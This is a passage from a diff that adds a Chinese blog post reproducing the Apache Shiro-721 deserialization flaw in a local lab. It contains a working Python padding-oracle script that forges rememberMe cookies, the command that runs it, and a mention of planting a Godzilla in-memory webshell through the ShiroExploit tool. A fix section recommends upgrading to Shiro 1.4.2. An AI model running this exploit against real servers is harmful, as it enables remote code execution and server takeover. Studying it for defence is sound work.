class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, **kwargs</span>):</span><br><span class="line">        <span class="built_in">super</span>(PadBuster, <span class="variable language_">self</span>).__init__(**kwargs)</span><br><span class="line">        <span class="variable language_">self</span>.session = requests.Session()</span><br><span class="line">        <span class="variable language_">self</span>.wait = kwargs.get(<span class="string">&#x27;wait&#x27;</span>, <span class="number">2.0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">self, data, **kwargs</span>):</span><br><span class="line">        somecookie = b64encode(b64decode(unquote(sys.argv[<span class="number">2</span>])) + data)</span><br><span class="line">        <span class="variable language_">self</span>.session.cookies[<span class="string">&#x27;rememberMe&#x27;</span>] = somecookie.decode()</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.session.cookies.get(<span class="string">&#x27;JSESSIONID&#x27;</span>):</span><br><span class="line">            <span class="keyword">del</span> <span class="variable language_">self</span>.session.cookies[<span class="string">&#x27;JSESSIONID&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = <span class="variable language_">self</span>.session.get(sys.argv[<span class="number">1</span>],</span><br><span class="line">                                            stream=<span class="literal">False</span>, timeout=<span class="number">5</span>, verify=<span class="literal">False</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> (socket.error, requests.exceptions.RequestException):</span><br><span class="line">                logging.exception(<span class="string">&#x27;Retrying request in %.2f seconds...&#x27;</span>,</span><br><span class="line">                                  <span class="variable language_">self</span>.wait)</span><br><span class="line">                time.sleep(<span class="variable language_">self</span>.wait)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.history.append(response)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> response.headers.get(<span class="string">&#x27;Set-Cookie&#x27;</span>) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="string">&#x27;deleteMe&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.headers.get(<span class="string">&#x27;Set-Cookie&#x27;</span>):</span><br><span class="line">            logging.debug(<span class="string">&#x27;No padding exception raised on %r&#x27;</span>, somecookie)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">raise</span> BadPaddingException</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> sys.argv[<span class="number">3</span>:]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Usage: %s &lt;url&gt; &lt;somecookie value&gt; &lt;payload&gt;&#x27;</span> % (sys.argv[<span class="number">0</span>], ))</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    logging.basicConfig(level=logging.DEBUG)</span><br><span class="line">    encrypted_cookie = b64decode(unquote(sys.argv[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">    padbuster = PadBuster()</span><br><span class="line"></span><br><span class="line">    payload = <span class="built_in">open</span>(sys.argv[<span class="number">3</span>], <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">    enc = padbuster.encrypt(plaintext=payload, block_size=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rememberMe cookies:&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(b64encode(enc).decode())</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 shiro_exp.py http://localhost:18080/login.jsp <span class="string">&quot;nL+znOILv0/X+VAYbYcR1Lo5K7aYTUT4NjuW/2cm9aInVj8ahWDOQKB9xZXUHUj+1T59a4lf1oLjQsWQZixAWS+qTUlBwsnU+YtIy9XU2PjFbiEdDpJkZxwjri8lw5tBEb0DQmh3E351h/o1tRuJcKghuezR5FBxWPwYainTUD8jVfgJJPaNWMGCmSpqmxTek2OtY16mgJQQ4Pmc1HENPecM+2N2gLrt/T6DfMtWRl1+7V3CCIm91E6FlambRnuCMdjdgXw+OQ+pyGlpR+3+ZjGk1b57UK/DNLVtywf1xkUCZM7lX9lKK/NZtnNVuLQ9FuprL9w99AWYzP+Ucr+ETim5xaDL2A2tivl0/S4Uzx7IMi+FE4qBilJB5Hh4Opdgul9Bwvk/18wRk1K95ellnjLMXVutool6KBkKRMDXAXBz9VEKy30RgZrDSS7V8HdV/tAoGpEtMJksj7qvV+TafDEE7+hLviVxUloa6mqBPIPKsH8X2aFpEH3r40DP/zhJ&quot;</span> payload.class 2&gt;&amp;1 | <span class="built_in">tee</span> run.log</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://kivvs.github.io/images/Shiro721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-11.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://kivvs.github.io/images/Shiro721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-12.png"
+                     
+                ></p>
+<p>最终会生成恶意的rememberMe cookie，我们使用这个cookie替换原数据包中的cookie。然后登陆进服务器看，会发现&#x2F;tmp目录下被创建了一个123文件。</p>
+<p>需要注意的是，这里原本的JSESSIONID要删除掉，否则服务器不会进行反序列化操作。</p>
+<h2 id="ShiroExploit工具复现"><a href="#ShiroExploit工具复现" class="headerlink" title="ShiroExploit工具复现"></a>ShiroExploit工具复现</h2><p>这里我们还可以使用 shiroexploit 工具</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://kivvs.github.io/images/Shiro721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-13.png"
+                     
+                ></p>
+<p>这里可以直接命令执行也可以打入内存马然后 get 到 webshell（这里我们用的是哥斯拉）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://kivvs.github.io/images/Shiro721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-14.png"
+                     
+                ></p>
+<p>可以看到这里命令执行成功，我们就可以执行恶意命令了</p>
+<h1 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h1><p>升级到 Shiro1.4.2 版本（Shiro1.4.2版本后，Shiro的加密模式由AES-CBC更换为AES-GCM）</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这里我们能够很清楚的明白 shiro721 和 shiro550 的区别，实际上就是利用了不同的加密方式，在复现手法上，由于自己人工利用脚本复现所需时间较长，我们更加侧重于利用工具复现，这样会方便很多。自此呢，我们 shiro 反序列化就学到这里，把两个基本的 shiro 的反序列化漏洞解决了。不过由于本人实力有限，属实还是菜鸟一个，有任何问题可以及时评论，欢迎大家多多交流。</p>
+<h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><p><a class="link"   target="_blank" rel="noopener" href="https://goodapple.top/archives/261" >https://goodapple.top/archives/261<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/smileleooo/p/18171246" >https://www.cnblogs.com/smileleooo/p/18171246<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/382841.html" >https://www.freebuf.com/vuls/382841.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/qianxinggz/p/13388405.html" >https://www.cnblogs.com/qianxinggz/p/13388405.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://lingade.github.io/2021/10/14/Padding-Oracle-Attack-Shiro-721-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0" >https://lingade.github.io/2021/10/14/Padding-Oracle-Attack-Shiro-721-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.windeskybb.work/archives/9a29da00-c5c1-4502-9d0b-178295fb660e#shrio-721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0" >https://www.windeskybb.work/archives/9a29da00-c5c1-4502-9d0b-178295fb660e#shrio-721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> Shiro721反序列化漏洞复现</li>
+        <li><strong>作者:</strong> kivvs</li>
+        <li><strong>创建于
+                :</strong> 2026-10-01 18:46:01</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2026-10-01 18:47:57
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://kivvs.github.io/2026/10/01/Shiro721反序列化漏洞复现/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Java/">#Java</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2026/09/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84Java%E9%93%BE%E5%88%86%E6%9E%90/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">Shiro反序列化的Java链分析</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div id="giscus-container"></div>
+    <script data-swup-reload-script defer>
+        (function() {
+            const containerId = "giscus-container";
+            const mapping = "pathname";
+            const lang = "zh-CN";
+            const inputPosition = "bottom";
+            const reactionsEnabled = "1" === "1";
+            const emitMetadata = "1" === "1";
+            const strict = "0" === "1";
+            const loading = "lazy";
+
+            const getTerm = () => {
+                if (mapping === "pathname") return location.pathname;
+                if (mapping === "url") return location.href;
+                if (mapping === "title") return document.title;
+                if (mapping === "og:title") {
+                    const ogTitle = document.querySelector("meta[property='og:title']");
+                    return ogTitle?.content || document.title;
+                }
+                return "";
+            };
+
+            const sendUpdate = () => {
+                const iframe = document.querySelector("iframe.giscus-frame");
+                if (!iframe) {
+                    return;
+                }
+
+                const setConfig = {
+                    theme: "preferred_color_scheme",
+                    lang,
+                    inputPosition,
+                    reactionsEnabled,
+                    emitMetadata,
+                    strict,
+                };
+
+                if (mapping !== "number") {
+                    const term = getTerm();
+                    if (term) {
+                        setConfig.term = term;
+                    }
+                }
+
+                iframe.contentWindow.postMessage(
+                    { giscus: { setConfig } },
+                    "https://giscus.app",
+                );
+            };
+
+            const loadGiscus = () => {
+                const container = document.getElementById(containerId);
+                if (!container) {
+                    return;
+                }
+
+                const iframe = container.querySelector("iframe.giscus-frame");
+                if (iframe) {
+                    sendUpdate();
+                    return;
+                }
+
+                if (container.dataset.giscusInit === "true") {
+                    return;
+                }
+
+                const giscusConfig = {
+                    src: "https://giscus.app/client.js",
+                    "data-repo": "kivvs/kivvs.github.io",
+                    "data-repo-id": "R_kgDOT3J6Jg",
+                    "data-category": "Announcements",
+                    "data-category-id": "DIC_kwDOT3J6Js4DDSMc",
+                    "data-mapping": mapping,
+                    "data-strict": "0",
+                    "data-reactions-enabled": "1",
+                    "data-emit-metadata": "1",
+                    "data-theme": "preferred_color_scheme",
+                    "data-lang": lang,
+                    "data-input-position": inputPosition,
+                    "data-loading": loading,
+                    crossorigin: "anonymous",
+                    async: true,
+                };
+
+                const giscusScript = document.createElement("script");
+                for (const key in giscusConfig) {
+                    giscusScript.setAttribute(key, giscusConfig[key]);
+                }
+                container.appendChild(giscusScript);
+                container.dataset.giscusInit = "true";
+            };
+
+            const runGiscus = () => {
+                const container = document.getElementById(containerId);
+                if (!container) {
+                    return;
+                }
+
+                if (container.querySelector("iframe.giscus-frame")) {
+                    sendUpdate();
+                    return;
+                }
+
+                loadGiscus();
+            };
+
+            runGiscus();
+        })();
+    </script>
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">Shiro721反序列化漏洞复现</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shiro721"><span class="nav-text">shiro721</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%B5%81%E7%A8%8B"><span class="nav-text">漏洞流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%89%B9%E5%BE%81%E5%88%A4%E6%96%AD"><span class="nav-text">特征判断</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Padding-Oracle-%E6%94%BB%E5%87%BB"><span class="nav-text">Padding Oracle 攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E5%A1%AB%E5%85%85"><span class="nav-text">1. 分组密码的填充</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-CBC%E6%A8%A1%E5%BC%8F%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95"><span class="nav-text">2. CBC模式密码算法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="nav-text">3.攻击原理</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shiro721-%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90%E7%9A%84%E5%88%86%E6%9E%90"><span class="nav-text">shiro721 密钥生成的分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#yso-%E6%89%8B%E5%B7%A5%E5%A4%8D%E7%8E%B0"><span class="nav-text">yso 手工复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ShiroExploit%E5%B7%A5%E5%85%B7%E5%A4%8D%E7%8E%B0"><span class="nav-text">ShiroExploit工具复现</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F"><span class="nav-text">修复方式</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3"><span class="nav-text">参考文档</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">kivvs</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 28 篇文章
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.9.0</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container" role="dialog" aria-modal="true" aria-label="图片查看器">
+	<button class="image-viewer-close" type="button" aria-label="关闭">
+		<i class="fa-solid fa-xmark"></i>
+	</button>
+	<button class="image-viewer-prev" type="button" aria-label="上一页">
+		<i class="fa-solid fa-chevron-left"></i>
+	</button>
+	<div class="image-viewer-frame">
+		<img src="" alt="">
+	</div>
+	<div class="image-viewer-exif-panel hidden absolute left-1/2 bottom-20 -translate-x-1/2 w-[min(92vw,420px)] max-h-[60vh] overflow-hidden rounded-2xl bg-background-color-transparent-80 p-4 text-left shadow-redefine-flat backdrop-blur-md" role="dialog" aria-label="EXIF" aria-hidden="true">
+		<div class="flex items-center justify-between mb-3">
+			<span class="text-sm font-semibold text-first-text-color">EXIF</span>
+			<button class="image-viewer-exif-close flex h-8 w-8 items-center justify-center rounded-full bg-background-color-transparent-80 text-first-text-color transition hover:bg-background-color-transparent-40" type="button" aria-label="关闭">
+				<i class="fa-solid fa-xmark text-[0.65rem]"></i>
+			</button>
+		</div>
+		<div class="image-viewer-exif-cards grid grid-cols-1 sm:grid-cols-2 gap-3 max-h-[50vh] overflow-y-auto pr-1 scrollbar-hide"></div>
+		<template class="image-viewer-exif-card-template">
+			<div class="rounded-lg bg-background-color-transparent-40 px-3 py-2">
+				<div class="image-viewer-exif-card-header flex items-center gap-2 mb-1">
+					<i class="image-viewer-exif-card-icon fa-solid fa-circle-info text-xs text-third-text-color"></i>
+					<div class="image-viewer-exif-card-title text-xs font-semibold text-first-text-color"></div>
+				</div>
+				<div class="image-viewer-exif-card-items flex flex-col gap-1"></div>
+			</div>
+		</template>
+	</div>
+	<button class="image-viewer-exif-toggle flex items-center gap-2 hidden absolute left-1/2 bottom-6 -translate-x-1/2 rounded-full border border-border-color bg-background-color-transparent-80 px-4 py-2 text-first-text-color backdrop-blur-md transition hover:bg-background-color-transparent-40" type="button" aria-label="EXIF" aria-expanded="false">
+		<i class="fa-solid fa-circle-info text-xs"></i>
+		<span class="text-xs font-semibold uppercase tracking-wider">EXIF</span>
+	</button>
+	<button class="image-viewer-next" type="button" aria-label="下一页">
+		<i class="fa-solid fa-chevron-right"></i>
+	</button>
+</div>
+
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    window.swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+
+    window.dispatchEvent(
+        new CustomEvent("redefine:swup:ready", {
+            detail: {
+                swup: window.swup,
+            },
+        }),
+    );
+</script>
+
+
+
+
+	
+<script src="/js/build/main.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+
+	
+</body>
+
+</html>
